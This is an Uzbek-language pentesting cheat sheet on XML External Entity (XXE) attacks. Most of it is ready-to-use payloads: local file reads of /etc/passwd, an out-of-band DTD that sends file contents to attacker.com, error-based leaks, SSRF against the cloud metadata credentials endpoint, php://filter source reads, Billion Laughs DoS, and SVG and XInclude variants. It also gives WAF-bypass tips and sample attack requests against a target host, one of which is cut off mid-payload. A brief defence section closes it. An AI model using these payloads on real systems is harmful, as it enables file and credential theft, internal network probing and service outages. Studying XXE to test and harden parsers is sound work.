# XML External Entity (XXE)

## 1. Ta'rif
XXE — XML parser external entity'ni yuklab, file'ni o'qishi / SSRF / internal host'ga so'rov yuborishi. XXE → RCE (PHP expect, SSRF, DoS).

## 2. Qayerdan kelib chiqadi
- XML keladi: `application/xml`, SOAP, SVG upload, DOCX/XLSX (OOXML), RSS feed, SAML, xxł
- Parser: `libxml`, `lxml`, `DocumentBuilder` (Java), `XmlDocument` (.NET), PHP `simplexml_load_string`
- XATOLIK: parser DTD ni enable qilgan, external entities ruxsat

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| In-band | Response ichida file chiqadi |
| Error-based | Error message orqali |
| Out-of-band | Data chiqmasa, entity HTTP/DNS orqali chiqariladi |
| Blind | Faqat ha/yo'q farqi |

## 4. Metodologiya
1. XML input topish: request turi `application/xml`, `text/xml`, yoki JSON->XML qayta ishlash.
2. Asosiy test:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
   ```
   - `file:///etc/passwd` chiqsa — in-band.
3. Chiqmasa — OOB:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/x.dtd"> %xxe;]>
   ```
   x.dtd da:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=&#37;file;'>">
   %eval;
   %exfil;
   ```
4. Byblind — `http://attacker.dnslog.cn` DNS zanjir.
5. Error-based:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
   ```
6. SSRF 'xt: `SYSTEM "http://169.254.169.254/latest/meta-data/"`.
7. PHP: `expect://id` (allow_url_include), `php://filter`.
8. SVG upload XXE — file o'qish + image.
9. XInclude / SOAP / OOXML document'da.

## 5. Payload'lar
```xml
<!-- In-band file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>

<!-- PHP file read -->
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
<r>&xxe;</r>

<!-- SSRF -->
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<r>&xxe;</r>

<!-- DoS Billion Laughs -->
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>

<!-- XInclude -->
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
            parse="text" href="file:///etc/passwd"/>

<!-- SVG -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="file:///etc/passwd"/>
</svg>
```

## 6. Request misollari
```
POST /api/order HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<order><id>&xxe;</id><qty>1</qty></order>

POST /upload HTTP/1.1
Host: target.com
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
<script>...
```
```

## 7. Zaif code misollari
```php
// ZAIF
$xml = file_get_contents('php://input');
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);

// Java — ZAIF
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();  // default external
// XAVFSIZ:
// f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// f.setFeature("http://xml.org/sax/features/external-general-entities", false)

// Python lxml — ZAIF
parser = etree.XMLParser(resolve_entities=True)
# XAVFSIZ: resolve_entities=False, no_network=True
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Content-Type'ni o'zgartirib XML yuboring — server JSON ni ham XML property qayta ishlashi mumkin
- [ ] SVG upload, .xml upload, DOCX (package of XML)
- [ ] SOAP/SAML/WebDAV/protocol ishlatilsa
- [ ] libxml 2.9+ bo'lsa bazi entity'lar default disable — lekin %x deklaratsiya (param entity) ishlaydi
- [ ] Blind bo'lsa — OOB DNS + http
- [ ] XXE SSRF'ga aylantirish — internal'gi o'qish
- [ ] WAF bypass — parameter entity, encoding (UCS-2/UTF-16, UTF-7, base64)

## 9. Himoya
- Parser'da DTD disallow, external entity/general entity'ni yopish
- Content-Type allowlist, XML ni JSON ga o'tkazish
- libxml_disable_entity_loader(true) PHP
- Input validation